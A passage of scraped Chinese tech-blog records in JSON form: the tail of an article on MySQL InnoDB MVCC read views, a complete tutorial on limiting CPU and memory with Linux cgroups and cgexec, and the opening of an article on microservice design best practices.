row_vers_build_for_consistent_read(...)\r\n{\r\n\t......\r\n\tfor(;;){\r\n\t\terr = trx_undo_prev_version_build(rec, mtr,version,index,*offsets, heap,&prev_version);\r\n\t\t......\r\n\t\ttrx_id = row_get_rec_trx_id(prev_version, index, *offsets);\r\n\t\t// 如果当前row版本符合一致性视图，则返回\r\n\t\tif (read_view_sees_trx_id(view, trx_id)) {\r\n\t\t\t......\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\t// 如果当前row版本不符合，则继续回溯上一个版本(回到for循环的地方)\r\n\t\tversion = prev_version;\r\n\t}\r\n\t......\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,dberr_t ,row_vers_build_for_consistent_read,(,.,.,.,),{,\t,.,.,.,.,.,.,\t,for,(,;,;,),{,\t\t,err, ,=, ,trx_undo_prev_version_build,(,rec,,, ,mtr,,,version,,,index,,,*,offsets,,, ,heap,,,&,prev_version,),;,\t\t,.,.,.,.,.,.,\t\t,trx_id, ,=, ,row_get_rec_trx_id,(,prev_version,,, ,index,,, ,*,offsets,),;,\t\t,// 如果当前row版本符合一致性视图，则返回,\t\t,if, ,(,read_view_sees_trx_id,(,view,,, ,trx_id,),), ,{,\t\t\t,.,.,.,.,.,.,\t\t\t,break,;,\t\t,},\t\t,// 如果当前row版本不符合，则继续回溯上一个版本(回到for循环的地方),\t\t,version, ,=, ,prev_version,;,\t,},\t,.,.,.,.,.,.,}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,整个过程如下图所示:,\n,\n至于undolog怎么恢复出对应版本的row记录就又是一个复杂的过程了，由于篇幅原因，在此略过不表。,\n,read_view创建时机再讨论,\n,在创建一致性视图的row_search_for_mysql的代码中,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n// 只有非锁模式的select才创建一致性视图\r\nelse if (prebuilt->select_lock_type == LOCK_NONE) {\t\t// 创建一致性视图\r\n\t\ttrx_assign_read_view(trx);\r\n\t\tprebuilt->sql_stat_start = FALSE;\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,// 只有非锁模式的select才创建一致性视图,else, ,if, ,(,prebuilt,->,select_lock_type, ,==, ,LOCK_NONE,), ,{,\t\t,// 创建一致性视图,\t\t,trx_assign_read_view,(,trx,),;,\t\t,prebuilt,->,sql_stat_start, ,=, ,FALSE,;,}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,trx_assign_read_view中由这么一段代码,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n// 一致性视图在一个事务只创建一次\r\nif (!trx->read_view) {\r\n\t\ttrx->read_view = read_view_open_now(\r\n\t\t\ttrx->id, trx->global_read_view_heap);\r\n\t\ttrx->global_read_view = trx->read_view;\r\n\t}\r\n\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,// 一致性视图在一个事务只创建一次,if, ,(,!,trx,->,read_view,), ,{,\t\t,trx,->,read_view, ,=, ,read_view_open_now,(,\t\t\t,trx,->,id,,, ,trx,->,global_read_view_heap,),;,\t\t,trx,->,global_read_view, ,=, ,trx,->,read_view,;,\t,}, , ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,所以综合这两段代码，即在一个事务中，只有第一次运行select(不加锁)的时候才会创建一致性视图,如下图所示: ,\n笔者构造了此种场景模拟过，确实如此。,\n,MVCC和锁的同时作用导致的一些现象,\n,MySQL是通过MVCC和二阶段锁(2PL)来兼顾性能和一致性的，但是由于MySQL仅仅在select时候才创建一致性视图，而在update等加锁操作的时候并不做如此操作，所以就会产生一些诡异的现象。如下图所示:,\n,\n如果理解了update不走一致性视图(read_view)，而select走一致性视图(read_view)，就可以很好解释这个现象。 如下图所示:,\n,\n,总结,\n,MySQL为了兼顾性能和ACID使用了大量复杂的机制，2PL(两阶段锁)和MVCC就是其实现的典型。幸好可以通过xcode等IDE进行方便的debug，这样就可以非常精确加便捷的追踪其各种机制的实现。希望这篇文章能够帮助到喜欢研究MySQL源码的读者们。,\n,\n,\n, ,\n,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114273/", "url_object_id": "9c2c07d9d67d6bd6fb879c9bf7e3aaa7", "front_image_path": "full/122897caaf5c7d1b1b7bfa67a1ac43c10e67c13a.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "Linux cgroups 命令简介", "create_time": "2018/08/23", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,sparkdev,   ,cgroups(Control Groups) 是 linux 内核提供的一种机制，,这种机制可以根据需求把一系列系统任务及其子任务整合(或分隔)到按资源划分等级的不同组内，从而为系统资源管理提供一个统一的框架,。简单说，cgroups 可以限制、记录任务组所使用的物理资源。本质上来说，cgroups 是内核附加在程序上的一系列钩子(hook)，通过程序运行时对资源的调度触发相应的钩子以达到资源追踪和限制的目的。,\n,本文以 Ubuntu 16.04 系统为例介绍 cgroups，所有的 demo 均在该系统中演示。,\n,为什么要了解 cgroups,\n,在以容器技术为代表的虚拟化技术大行其道的时代了解 cgroups 技术是非常必要的！比如我们可以很方便的限制某个容器可以使用的 CPU、内存等资源，这究竟是如何实现的呢？通过了解 cgroups 技术，我们可以窥探到 linux 系统中整个资源限制系统的脉络。从而帮助我们更好的理解和使用 linux 系统。,\n,cgroups 的主要作用,\n,实现 cgroups 的主要目的是为不同用户层面的资源管理提供一个统一化的接口。从单个任务的资源控制到操作系统层面的虚拟化，cgroups 提供了四大功能：,\n,\n,资源限制：cgroups 可以对任务是要的资源总额进行限制。比如设定任务运行时使用的内存上限，一旦超出就发 OOM。,\n,优先级分配：通过分配的 CPU 时间片数量和磁盘 IO 带宽，实际上就等同于控制了任务运行的优先级。,\n,资源统计：cgoups 可以统计系统的资源使用量，比如 CPU 使用时长、内存用量等。这个功能非常适合当前云端产品按使用量计费的方式。,\n,任务控制：cgroups 可以对任务执行挂起、恢复等操作。,\n,\n,相关概念,\n,Task(任务), 在 linux 系统中，内核本身的调度和管理并不对进程和线程进行区分，只是根据 clone 时传入的参数的不同来从概念上区分进程和线程。这里使用 task 来表示系统的一个进程或线程。,\n,Cgroup(控制组), cgroups 中的资源控制以 cgroup 为单位实现。Cgroup 表示按某种资源控制标准划分而成的任务组，包含一个或多个子系统。一个任务可以加入某个 cgroup，也可以从某个 cgroup 迁移到另一个 cgroup。,\n,Subsystem(子系统), cgroups 中的子系统就是一个资源调度控制器(又叫 controllers)。比如 CPU 子系统可以控制 CPU 的时间分配，内存子系统可以限制内存的使用量。以笔者使用的 Ubuntu 16.04.3 为例，其内核版本为 4.10.0，支持的 subsystem 如下( cat /proc/cgroups)：,\n,blkio,         对块设备的 IO 进行限制。,\n,cpu,           限制 CPU 时间片的分配，与 cpuacct 挂载在同一目录。,\n,cpuacct,     生成 cgroup 中的任务占用 CPU 资源的报告，与 cpu 挂载在同一目录。,\n,cpuset,       给 cgroup 中的任务分配独立的 CPU(多处理器系统) 和内存节点。,\n,devices,     允许或禁止 cgroup 中的任务访问设备。,\n,freezer,      暂停/恢复 cgroup 中的任务。,\n,hugetlb,     限制使用的内存页数量。,\n,memory,    对 cgroup 中的任务的可用内存进行限制，并自动生成资源占用报告。,\n,net_cls,      使用等级识别符（classid）标记网络数据包，这让 Linux 流量控制器（tc 指令）可以识别来自特定 cgroup 任务的数据包，并进行网络限制。,\n,net_prio,    允许基于 cgroup 设置网络流量(netowork traffic)的优先级。,\n,perf_event,  允许使用 perf 工具来监控 cgroup。,\n,pids,          限制任务的数量。,\n,Hierarchy(层级), 层级有一系列 cgroup 以一个树状结构排列而成，每个层级通过绑定对应的子系统进行资源控制。层级中的 cgroup 节点可以包含零个或多个子节点，子节点继承父节点挂载的子系统。一个操作系统中可以有多个层级。,\n,cgroups 的文件系统接口,\n,cgroups 以文件的方式提供应用接口，我们可以通过 mount 命令来查看 cgroups 默认的挂载点：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ mount | grep cgroup,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,mount, ,|, ,grep ,cgroup,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,\n,第一行的 tmpfs 说明 /sys/fs/cgroup 目录下的文件都是存在于内存中的临时文件。,\n第二行的挂载点 /sys/fs/cgroup/systemd 用于 systemd 系统对 cgroups 的支持，相关内容笔者今后会做专门的介绍。,\n其余的挂载点则是内核支持的各个子系统的根级层级结构。,\n,需要注意的是，在使用 systemd 系统的操作系统中，/sys/fs/cgroup 目录都是由 systemd 在系统启动的过程中挂载的，并且挂载为只读的类型。换句话说，系统是不建议我们在 /sys/fs/cgroup 目录下创建新的目录并挂载其它子系统的。这一点与之前的操作系统不太一样。,\n,下面让我们来探索一下 /sys/fs/cgroup 目录及其子目录下都是些什么：,\n,\n,/sys/fs/cgroup 目录下是各个子系统的根目录。我们以 memory 子系统为例，看看 memory 目录下都有什么？,\n,\n,这些文件就是 cgroups 的 memory 子系统中的根级设置。比如 memory.limit_in_bytes 中的数字用来限制进程的最大可用内存，memory.swappiness 中保存着使用 swap 的权重等等。,\n,既然 cgroups 是以这些文件作为 API 的，那么我就可以通过创建或者是修改这些文件的内容来应用 cgroups。具体该怎么做呢？比如我们怎么才能限制某个进程可以使用的资源呢？接下来我们就通过简单的 demo 来演示如何使用 cgroups 限制进程可以使用的资源。,\n,查看进程所属的 cgroups,\n,可以通过 /proc/[pid]/cgroup 来查看指定进程属于哪些 cgroup：,\n,\n,每一行包含用冒号隔开的三列，他们的含义分别是：,\n,\n,cgroup 树的 ID， 和 /proc/cgroups 文件中的 ID 一一对应。,\n,和 cgroup 树绑定的所有 subsystem，多个 subsystem 之间用逗号隔开。这里 name=systemd 表示没有和任何 subsystem 绑定，只是给他起了个名字叫 systemd。,\n,进程在 cgroup 树中的路径，即进程所属的 cgroup，这个路径是相对于挂载点的相对路径。,\n,\n,既然 cgroups 是以这些文件作为 API 的，那么我就可以通过创建或者是修改这些文件的内容来应用 cgroups。具体该怎么做呢？比如我们怎么才能限制某个进程可以使用的资源呢？接下来我们就通过简单的 demo 来演示如何使用 cgroups 限制进程可以使用的资源。,\n,cgroups 工具,\n,在介绍通过 systemd 应用 cgroups 之前，我们先使用 cgroup-bin 工具包中的 cgexec 来演示 demo。Ubuntu 默认没有安装 cgroup-bin 工具包，请通过下面的命令安装：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo apt install cgroup-bin,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,apt ,install ,cgroup,-,bin,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,demo：限制进程可用的 CPU,\n,在我们使用 cgroups 时，最好不要直接在各个子系统的根目录下直接修改其配置文件。推荐的方式是为不同的需求在子系统树中定义不同的节点。比如我们可以在 /sys/fs/cgroup/cpu 目录下新建一个名称为 nick_cpu 的目录：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ cd  /sys/fs/cgroup/cpu\r\n$ sudo mkdir nick_cpu,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,cd,  ,/,sys,/,fs,/,cgroup,/,cpu,$, ,sudo ,mkdir ,nick_cpu,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,然后查看新建的目录下的内容：,\n,\n,是不是有点吃惊，cgroups 的文件系统会在创建文件目录的时候自动创建这些配置文件！,\n,让我们通过下面的设置把 CPU 周期限制为总量的十分之一：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo su\r\n$ echo 100000 > nick_cpu/cpu.cfs_period_us\r\n$ echo 10000 > nick_cpu/cpu.cfs_quota_us,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,su,$, ,echo, ,100000, ,>, ,nick_cpu,/,cpu,.,cfs_period,_,us,$, ,echo, ,10000, ,>, ,nick_cpu,/,cpu,.,cfs_quota_us,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,上面的两个参数眼熟吗？没错，笔者在《,Docker: 限制容器可用的 CPU,》一文中介绍的 “–cpu-period=100000 –cpu-quota=200000” 就是由它们实现的。,\n,然后创建一个 CPU 密集型的程序：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nvoid main()\r\n{\r\n    unsigned int i, end;\r\n\r\n    end = 1024 * 1024 * 1024;\r\n    for(i = 0; i < end; )\r\n    {\r\n        i ++;\r\n    }\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,void, ,main,(,),{,    ,unsigned, ,int, ,i,,, ,end,;, ,    ,end, ,=, ,1024, ,*, ,1024, ,*, ,1024,;,    ,for,(,i, ,=, ,0,;, ,i, ,<, ,end,;, ,),    ,{,        ,i, ,++,;,    ,},},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,保存为文件 cputime.c 编译并通过不同的方式执行：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ gcc cputime.c -o cputime\r\n$ sudo su\r\n$ time ./cputime\r\n$ time cgexec -g cpu:nick_cpu ./cputime,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,gcc ,cputime,.,c, ,-,o, ,cputime,$, ,sudo ,su,$, ,time, ,.,/,cputime,$, ,time ,cgexec, ,-,g, ,cpu,:,nick,_,cpu, ,.,/,cputime,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,\n,time 命令可以为我们报告程序执行消耗的时间，其中的 real 就是我们真实感受到的时间。使用 cgexec 能够把我们添加的 cgroup 配置 nick_cpu 应用到运行 cputime 程序的进程上。 上图显示，默认的执行只需要 2s 左右。通过 cgroups 限制 CPU 资源后需要运行 23s。,\n,demo：限制进程可用的内存,\n,这次我们来限制进程可用的最大内存，在 /sys/fs/cgroup/memory 下创建目录nick_memory：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ cd  /sys/fs/cgroup/memory\r\n$ sudo mkdir nick_memory,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,cd,  ,/,sys,/,fs,/,cgroup,/,memory,$, ,sudo ,mkdir ,nick_memory,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,下面的设置把进程的可用内存限制在最大 300M，并且不使用 swap：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n# 物理内存 + SWAP <= 300 MB；1024*1024*300 = 314572800\r\n$ sudo su\r\n$ echo 314572800 > nick_memory/memory.limit_in_bytes\r\n$ echo 0 > nick_memory/memory.swappiness,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,# 物理内存 + SWAP <= 300 MB；1024*1024*300 = 314572800,$, ,sudo ,su,$, ,echo, ,314572800, ,>, ,nick_memory,/,memory,.,limit_in,_,bytes,$, ,echo, ,0, ,>, ,nick_memory,/,memory,.,swappiness,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,然后创建一个不断分配内存的程序，它分五次分配内存，每次申请 100M：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n\r\n#define CHUNK_SIZE 1024 * 1024 * 100\r\n\r\nvoid main()\r\n{\r\n    char *p;\r\n    int i;\r\n\r\n    for(i = 0; i < 5; i ++)\r\n    {\r\n        p = malloc(sizeof(char) * CHUNK_SIZE);\r\n        if(p == NULL)\r\n        {\r\n            printf(\"fail to malloc!\");\r\n            return ;\r\n        }\r\n        // memset() 函数用来将指定内存的前 n 个字节设置为特定的值\r\n        memset(p, 0, CHUNK_SIZE);\r\n        printf(\"malloc memory %d MB\\n\", (i + 1) * 100);\r\n    }\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,#include <stdio.h>,#include <stdlib.h>,#include <string.h>, ,#define CHUNK_SIZE 1024 * 1024 * 100, ,void, ,main,(,),{,    ,char, ,*,p,;,    ,int, ,i,;, ,    ,for,(,i, ,=, ,0,;, ,i, ,<, ,5,;, ,i, ,++,),    ,{,        ,p, ,=, ,malloc,(,sizeof,(,char,), ,*, ,CHUNK_SIZE,),;,        ,if,(,p, ,==, ,NULL,),        ,{,            ,printf,(,\"fail to malloc!\",),;,            ,return, ,;,        ,},        ,// memset() 函数用来将指定内存的前 n 个字节设置为特定的值,        ,memset,(,p,,, ,0,,, ,CHUNK_SIZE,),;,        ,printf,(,\"malloc memory %d MB\\n\",,, ,(,i, ,+, ,1,), ,*, ,100,),;,    ,},},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,把上面的代码保存为 mem.c 文件，然后编译：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ gcc mem.c -o mem,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,gcc ,mem,.,c, ,-,o, ,mem,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,执行生成的 mem 程序：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ./mem,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,.,/,mem,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,此时一切顺利，然后加上刚才的约束试试：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ cgexec -g memory:nick_memory ./mem,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,cgexec, ,-,g, ,memory,:,nick,_,memory, ,.,/,mem,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,\n,由于内存不足且禁止使用 swap，所以被限制资源的进程在申请内存时被强制杀死了。,\n,下面再使用 stress 程序测试一个类似的场景(通过 stress 程序申请 500M 的内存)：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo cgexec -g memory:nick_memory stress --vm 1 --vm-bytes 500000000 --vm-keep --verbose,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,cgexec, ,-,g, ,memory,:,nick_memory ,stress, ,--,vm, ,1, ,--,vm,-,bytes, ,500000000, ,--,vm,-,keep, ,--,verbose,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,\n,stress 程序能够提供比较详细的信息，进程被杀掉的方式是收到了 SIGKILL(signal 9) 信号。,\n,实际应用中往往要同时限制多种的资源，比如既限制 CPU 资源又限制内存资源。使用 cgexec 实现这样的用例其实很简单，直接指定多个 -g 选项就可以了：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ cgexec -g cpu:nick_cpu -g memory:nick_memory ./cpumem,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,cgexec, ,-,g, ,cpu,:,nick_cpu, ,-,g, ,memory,:,nick,_,memory, ,.,/,cpumem,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,总结,\n,cgroups 是 linux 内核提供的功能，由于牵涉的概念比较多，所以不太容易理解。本文试图在介绍概念性内容的同时，用最简单的 demo 演示 cgroups 的用法。希望直观的 demo 能够帮助大家理解 cgroups。,\n,参考：,\n,Linux Control Group 简介,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114311/", "url_object_id": "38e12d9177117bb18c9b4d7c45adfd75", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/01/bb278c4985b1e32dab4f29c11a7c0bdc.png"], "title": "设计微服务的最佳实践", "create_time": "2018/08/23", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,帝都羊,   ,你是否曾想过，,什么是微服务？,以及大规模的互联网行业，例如社交，电商，物流，金融等领域，如何使用微服务构建互联网应用以满足用户需求。,\n,要了解,微服务是什么,，你必须了解如何将单体应用程序，拆解为独立打包和部署的微型应用程序。本文章将帮助你清晰化的理解，开发者如何根据需求使用微服务来构建他们的应用程序。,\n,下面，从以下几个维度进行阐述,\n,为何选择微服务？,\n,什么是微服务？,\n,微服务架构的功能,\n,微服务架构的优点,\n,设计微服务的最佳实践,\n,1，为何选择微服务？,\n,现在，在我介绍微服务之前，让我们看看在微服务之前流行的架构，即,单体架构。,\n,通俗地说，您可以说它类似于一个大容器，在这个容器中，应用程序的所有软件组件被紧密地打包并部署在一起。,\n,罗列一下单片架构的挑战：,\n,\n,不灵活 ,– 单片应用程序无法使用不同的技术构建,\n,不可靠 ,– 即使系统的某个功能不起作用，整个系统也不起作用,\n,不可扩展, – 由于每次需要更新应用程序时都无法轻松扩展应用程序，因此必须重建整个系统,\n,妨碍持续开发, – 无法同时构建和部署应用程序的多个功能,\n,缓慢的开发, – 单体应用程序的开发需要花费大量的时间来构建，因为每个功能都必须一个接一个地构建,\n,不适合复杂的应用程序, – 复杂应用程序的功能具有紧密耦合的依赖关系,\n,上述挑战是导致微服务发展的主要原因。,\n,2，什么是微服务？,\n,微服务,，又称微服务架构，是一种架构风格，它将应用程序构建为以业务领域为模型的小型自治服务集合。,\n,\n,在微服务架构中，每个服务都是独立的，并实现单一业务功能。,\n,传统架构与微服务架构之间的差异,\n,以电子商务网站为例，了解它们之间的差异。,\n,\n,我们在上图中观察到的主要区别是，所有功能最初都在共享单个数据库的单个实例下。 但是，通过微服务，每个功能都被分配了不同的微服务，处理自己的数据，并执行不同的功能。,\n,现在，让我们通过查看其架构来了解有关微服务的更多信息。请参考下图：,\n,微服务架构,\n,\n,1，来自不同设备的不同客户端尝试使用不同的服务，如搜索，构建，配置和其他管理功能,\n,2，所有服务都根据其域和功能分开，并进一步切分成各个微服务,\n,3，这些微服务有自己的负载均衡器和执行环境来执行它们的功能，同时在自己的数据库中捕获数据,\n,4，所有微服务都通过无状态服务器（REST或消息队列）相互通信,\n,5，微服务在服务发现中心的帮助下获取其通信路径，并执行自动化，监控等操作功能,\n,6，然后，微服务执行的所有功能都通过API网关传达给客户端,\n,7，所有内部点都从API网关连接。因此，任何连接到API网关的人都会自动连接到整个系统,\n,现在，让我们通过查看其功能来了解有关微服务的更多信息。,\n,3，微服务功能,\n,\n,解耦 – ,系统内的服务很大程度上是分离的。因此，整个应用程序可以轻松构建，更改和扩展,\n,组件化 –, 微服务被视为可以轻松更换和升级的独立组件,\n,业务能力 – ,微服务非常简单，专注于单一功能,\n,自治 – ,开发人员和团队可以彼此独立工作，从而提高速度,\n,持续交付 –, 通过软件创建，测试和审批的系统自动化，允许频繁发布软件,\n,职责 – ,微服务不关注作为项目的应用程序。相反，他们将应用程序视为他们负责的产品,\n,分散治理 – ,重点是使用正确的工具来做正确的工作。这意味着没有标准化模式或任何技术模式。开发人员可以自由选择最有用的工具来解决他们的问题,\n,敏捷 – ,微服务支持敏捷开发。任何新功能都可以快速开发并再次丢弃。,\n,4，微服务的优点,\n,\n,独立开发 – ,所有微服务都可以根据各自的功能轻松开发,\n,独立部署 – ,基于其服务，可以在任何应用程序中单独部署它们,\n,故障隔离 – ,即使应用程序的一项服务不起作用，系统仍可继续运行,\n,混合技术堆栈 – ,可以使用不同的语言和技术来构建同一应用程序的不同服务,\n,粒度缩放 – ,单个组件可根据需要进行部署节点缩放，无需将所有组件部署缩放在一起,\n,5，设计微服务的最佳实践,\n,在当今世界，复杂性已经蔓延到互联网的每个产品当中。微服务架构有望保持团队规模和功能更好。,\n,现在，让我们看一个案列来更好地理解微服务。,\n,案例：购物网站,\n,当您打开购物网站时，您看到的只是一个购买页面。但是，在幕后，购物网站具有接受付款的服务，用于客户咨询的服务等,\n,假设此网站的开发人员已在单一框架中创建它。请参阅下图：,\n,\n,因此，所有功能都放在一个代码库中，并且位于单个底层数据库下。,\n,现在，让我们假设市场上出现了一个新的品牌，开发商希望将即将到来的品牌所有细节都放在这个网站中，原有的数据库结构和UI展示已经无法满足。,\n,然后，他们不仅需要为新标签重做服务，而且还必须重新构建整个系统并相应地进行部署。,\n,为避免此类挑战，购物网站的开发人员决定将其应用程序从单片架构转移到微服务。请参阅下图了解购物网站的微服务架构。,\n,\n,这意味着开发人员不会创建Web微服务，逻辑微服务或数据库微服务。相反，他们为搜索，推荐，客户服务等创建单独的微服务。,\n,这种类型的应用程序架构不仅可以帮助开发人员克服以前架构所面临的所有挑战，还可以帮助轻松构建，部署和扩展购物车应用程序。,\n,通过上述案列，我们可以总结出来，设计微服务的最佳实践：,\n,\n,1，为每个微服务分别存储数据,\n,2，将代码保持在类似